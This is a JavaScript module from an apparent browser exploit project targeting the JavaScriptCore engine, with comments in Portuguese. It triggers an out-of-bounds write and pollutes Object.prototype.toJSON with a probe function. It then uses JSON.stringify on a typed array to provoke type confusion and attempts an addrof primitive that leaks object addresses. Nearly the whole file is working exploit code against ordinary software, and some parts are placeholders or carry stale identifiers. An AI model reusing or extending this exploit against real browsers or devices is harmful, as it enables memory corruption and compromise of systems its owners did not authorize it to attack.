// js/script3/testArrayBufferVictimCrash.mjs (v83_CorruptM2Structure)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs'; // Para JSCell offsets

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CMS = "OriginalHeisenbug_TypedArrayAddrof_v83_CorruptM2Structure";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE_V83 = 0xFFFFFFFF; // Usar valor estável para a corrupção principal

let object_to_leak_A_v83 = null;
let victim_typed_array_ref_v83 = null; 
let probe_call_count_v83 = 0;
let marker_M1_ref_v83 = null; 
let marker_M2_ref_v83 = null; 
let details_of_M2_corruption_attempt_v83 = null; 
const PROBE_CALL_LIMIT_V83 = 5; 

// Valores especulativos para tentar escrever no 'this' (M2) confuso
// Estes seriam ideais se tivéssemos um StructureID de um JSObject que armazena doubles/JSValues
// e um ponteiro para o buffer da vítima. Por agora, são placeholders.
const SPECULATIVE_STRUCTURE_ID_LOW_V83 = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 0x11223344; // Usar um ID conhecido ou placeholder
const SPECULATIVE_STRUCTURE_ID_HIGH_V83 = 0x00000000; // Assumindo que ID cabe em 32 bits

// Não temos como saber o endereço do buffer da vítima para criar um butterfly falso.
// Vamos tentar valores nulos ou placeholders para o butterfly por enquanto.
const SPECULATIVE_BUTTERFLY_LOW_V83 = 0x0; 
const SPECULATIVE_BUTTERFLY_HIGH_V83 = 0x0;


function toJSON_TA_Probe_CorruptM2Structure() {
    probe_call_count_v83++;
    const call_num = probe_call_count_v83;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V83_CorruptM2Structure",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v83),
        this_is_M1: (this === marker_M1_ref_v83 && marker_M1_ref_v83 !== null),
        this_is_M2: (this === marker_M2_ref_v83 && marker_M2_ref_v83 !== null),
        m2_corruption_summary: null, 
        error_in_probe: null
    };
    logS3(`[PROBE_V83] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    if (current_call_log_info.this_is_M2 || !details_of_M2_corruption_attempt_v83 || call_num > (details_of_M2_corruption_attempt_v83.call_number || 0) ) {
        details_of_M2_corruption_attempt_v83 = current_call_log_info;
    }
    
    try {
        if (call_num > PROBE_CALL_LIMIT_V83) { return { recursion_stopped_v83: true }; }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            marker_M2_ref_v83 = { marker_id_v83: "M2_V83_Target" }; 
            marker_M1_ref_v83 = { marker_id_v83: "M1_V83_Container", payload_M2: marker_M2_ref_v83 };
            return marker_M1_ref_v83;
        } else if (call_num >= 2 && current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
            logS3(`[PROBE_V83] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v83}. Attempting structure corruption...`, "vuln");
            current_call_log_info.m2_corruption_summary = { 
                structure_id_write_attempted: false, 
                butterfly_write_attempted: false,
                leaky_prop_assigned: false,
                keys_after: "N/A"
            };
            
            try {
                // Tentar sobrescrever o que seria StructureID (primeiros 8 bytes do JSCell)
                // JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET é 0, mas Structure* está em 0x8.
                // Vamos assumir que 'this' (M2) é agora um JSCell e tentar escrever no campo Structure*.
                // Precisamos escrever um Int64. this[0] e this[1] são interpretados como propriedades de objeto,
                // não como escrita em memória bruta do objeto 'this'.
                // Esta abordagem de this[offset_em_slots_de_double] não corrompe a estrutura do objeto 'this' em si.
                // Ela apenas adiciona propriedades.
                // A corrupção de estrutura precisaria de uma primitiva de escrita mais poderosa (OOB write no endereço de M2).
                // O que podemos fazer é ver se o M2 confuso aceita propriedades numéricas como doubles.
                
                // Por enquanto, apenas definimos a propriedade leaky_A.
                // A "corrupção de estrutura" agressiva aqui seria tentar usar 'this' como um DataView
                // se a type confusion fosse profunda, mas isso é muito improvável.
                // this.structure_low  = SPECULATIVE_STRUCTURE_ID_LOW_V83;  // this[0] interpretado como double/qword
                // this.structure_high = SPECULATIVE_STRUCTURE_ID_HIGH_V83; // this[1] interpretado como double/qword
                // this.butterfly_low  = SPECULATIVE_BUTTERFLY_LOW_V83;   // this[2]
                // this.butterfly_high = SPECULATIVE_BUTTERFLY_HIGH_V83;  // this[3]
                // logS3(`[PROBE_V83]   Speculative structure fields written to 'this' (M2).`, "info");
                // current_call_log_info.m2_corruption_summary.structure_id_write_attempted = true;
                // current_call_log_info.m2_corruption_summary.butterfly_write_attempted = true;

                // Após "corrupção", tentar definir a propriedade de leak
                this.leaky_A_v83 = object_to_leak_A_v83;
                current_call_log_info.m2_corruption_summary.leaky_prop_assigned = true;
                logS3(`[PROBE_V83]   Leaky prop set on 'this' (M2).`, "info");

            } catch (e_corrupt) {
                logS3(`[PROBE_V83]   Error during M2 structure corruption/prop set: ${e_corrupt.message}`, "error");
                current_call_log_info.m2_corruption_summary.error = e_corrupt.message;
            }
            try{ current_call_log_info.m2_corruption_summary.keys_after = Object.keys(this).join(','); } catch(e){}
            logS3(`[PROBE_V83] Call #${call_num}: M2 ('this') modification attempt done. Keys: ${current_call_log_info.m2_corruption_summary.keys_after}`, "info");
            
            return this; 
        }
    } catch (e) { current_call_log_info.error_in_probe = e.message; }
    
    return { generic_marker_v83: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_CorruptM2Structure() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CMS}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (CorruptM2Structure) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CMS} Init...`;

    // Apenas um valor OOB para este teste focado na corrupção de M2
    const current_oob_value = OOB_WRITE_VALUE_V83; 
    const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;

    probe_call_count_v83 = 0;
    victim_typed_array_ref_v83 = null; 
    marker_M1_ref_v83 = null;
    marker_M2_ref_v83 = null;
    details_of_M2_corruption_attempt_v83 = null;
    object_to_leak_A_v83 = { marker_A_v83: `LeakA_Val${toHex(current_oob_value)}`}; 
    // object_to_leak_B não usado neste teste simplificado

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let addrof_M2_LeakyA = { success: false, msg: "M2.leaky_A_v83: Default"};
    const fillPattern = 0.83838383838383;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
        logS3(`  OOB Write done for Val${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
        await PAUSE_S3(100);
        victim_typed_array_ref_v83 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        logS3(`STEP 2: victim_typed_array_ref_v83 created.`, "test", FNAME_CURRENT_ITERATION);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CorruptM2Structure, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v83); 
            logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
            try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch (e_parse) { /* ... */ }
            
            logS3(`  EXECUTE: Details of M2 corruption attempt (if occurred): ${details_of_M2_corruption_attempt_v83 ? JSON.stringify(details_of_M2_corruption_attempt_v83) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

            let heisenbugOnM2 = details_of_M2_corruption_attempt_v83?.this_is_M2 && details_of_M2_corruption_attempt_v83?.this_type === "[object Object]";
            logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                
            let m2_payload_from_stringify = null;
            if (stringifyOutput_parsed?.marker_id_v83 === "M1_V78a" && stringifyOutput_parsed.payload_M2) { // Usando ID antigo, ajustar se necessário. Deveria ser M1_V83
                 m2_payload_from_stringify = stringifyOutput_parsed.payload_M2; 
            } else if (stringifyOutput_parsed?.marker_id_v83 === "M2_V83_Target") { 
                 m2_payload_from_stringify = stringifyOutput_parsed; 
            }

            if (m2_payload_from_stringify?.marker_id_v83 === "M2_V83_Target") {
                const val_leaky_A = m2_payload_from_stringify.leaky_A_v83; 
                if (typeof val_leaky_A === 'number' && !isNaN(val_leaky_A) && val_leaky_A !== 0) {
                    // ... (checagem de ponteiro)
                     addrof_M2_LeakyA.success = true; addrof_M2_LeakyA.msg = `Val: ${val_leaky_A}`;
                } else if (val_leaky_A && val_leaky_A.marker_A_v83 === object_to_leak_A_v83.marker_A_v83) {
                     addrof_M2_LeakyA.success = true; addrof_M2_LeakyA.msg = "ObjA identity from M2.leaky_A_v83.";
                } else { addrof_M2_LeakyA.msg = `M2.leaky_A_v83 not ptr/identity. Val: ${JSON.stringify(val_leaky_A)}`; }
            } else { /* M2 não encontrado */ }

        } catch (e_str) { errorCapturedMain = e_str;
        } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
    } catch (e_outer) { errorCapturedMain = e_outer;
    } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
    
    // Definir título com base no resultado
    if (addrof_M2_LeakyA.success) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CMS}: AddrInM2 SUCCESS!`;
    } else if (details_of_M2_corruption_attempt_v83?.this_is_M2 && details_of_M2_corruption_attempt_v83?.this_type === '[object Object]') {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CMS}: M2_TC OK, Addr Fail`;
    } else {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CMS}: No M2_TC?`;
    }
    if (errorCapturedMain) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V83_CMS}: JS_ERR: ${errorCapturedMain.name}`;
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Iteration Val${toHex(current_oob_value)} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Addrof M2.leaky_A: Success=${addrof_M2_LeakyA.success}, Msg='${addrof_M2_LeakyA.msg}'`, addrof_M2_LeakyA.success ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
        
    return { 
        errorOccurred: errorCapturedMain, 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: details_of_M2_corruption_attempt_v83 ? JSON.parse(JSON.stringify(details_of_M2_corruption_attempt_v83)) : null, 
        total_probe_calls: probe_call_count_v83,
        addrof_A_result: addrof_M2_LeakyA, // Mapeando para o runner
    };
}
